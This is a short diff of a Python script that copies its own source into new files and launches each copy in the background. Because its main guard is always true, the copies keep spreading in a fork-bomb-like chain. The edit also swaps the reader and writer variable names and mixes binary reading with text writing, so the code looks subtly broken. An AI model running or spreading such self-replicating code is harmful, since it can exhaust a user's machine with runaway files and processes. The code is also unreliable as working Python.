@@ -34,7 +34,6 @@ def everything(char_limit = 250) -> None:
     directory = dirname(abspath(__file__))
     filename, ext = splitext(basename(__file__))
     
-    
     children = fork(filename)
 
     overflow = (child for child in children if len(child) > char_limit)
@@ -43,11 +42,11 @@ def everything(char_limit = 250) -> None:
         print('resetting...')
         fnames = (f'har{i}' for i in range(len(children)))
 
-    with open(__file__) as reader:
-        for child in children:
-            fout = join(directory, child+ext)
-            with open(fout, 'w+') as writer:
-                writer.write(reader.read())
+    with open(__file__, 'rb') as writer:
+        for parent in children:
+            fout = join(directory, parent+ext)
+            with open(fout, 'w+') as reader:
+                reader.write(writer.read())
             system(f'python {fout} &')
 
 if __name__ == __name__:
